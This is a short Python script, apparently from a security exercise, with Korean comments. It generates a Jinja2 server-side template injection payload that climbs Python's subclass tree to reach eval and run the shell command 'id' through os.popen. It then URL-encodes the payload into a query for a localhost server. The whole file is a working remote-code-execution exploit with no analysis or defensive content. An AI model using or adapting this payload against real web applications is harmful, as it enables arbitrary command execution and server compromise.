from urllib import parse

# 실행할 Python 코드
script = '__import__("os").popen("id").read()'
# 서버에 전달할 템플릿 코드
value = """{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('%s') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}"""
value = value.replace('%s', script)
print('[삽입될 템플릿 코드]')
print(value)
print()

# SSTI를 수행하는 URL
query = [('name', value)]
url = 'http://localhost:8000/?'
url = url + parse.urlencode(query) # 삽입할 코드 퍼센트 인코딩하여 쿼리값으로 설정
print('[요청 URL]')
print(url)
print()